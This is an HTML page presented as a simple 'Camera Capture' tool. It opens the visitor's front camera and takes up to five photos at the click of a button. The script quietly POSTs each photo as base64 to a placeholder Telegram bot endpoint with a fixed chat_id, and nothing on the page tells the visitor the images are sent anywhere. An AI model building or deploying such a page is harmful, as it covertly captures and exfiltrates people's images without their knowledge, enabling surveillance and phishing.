<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
</head>
<body>
    <h1>Click the button to capture 5 photos</h1>
    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
    <button id="capture">Capture Photo</button>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureButton = document.getElementById('capture');

        // Access the camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                console.error("Error accessing the camera: ", err);
            });

        let photoCount = 0;

        // Capture photo when button is clicked
        captureButton.addEventListener('click', () => {
            if (photoCount >= 5) {
                alert("You have captured 5 photos already!");
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            // Convert canvas image to base64
            const imageBase64 = canvas.toDataURL('image/png');

            // Send the image to Telegram bot (replace YOUR_TELEGRAM_BOT_URL with your actual URL)
            fetch('YOUR_TELEGRAM_BOT_URL', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: 7996177041,
                    photo: imageBase64
                })
            }).then(response => {
                console.log("Photo sent successfully!");
            }).catch(error => {
                console.error("Error sending photo: ", error);
            });

            photoCount++;
            if (photoCount === 5) {
                alert("You have captured all 5 photos!");
            }
        });
    </script>
</body>
</html>
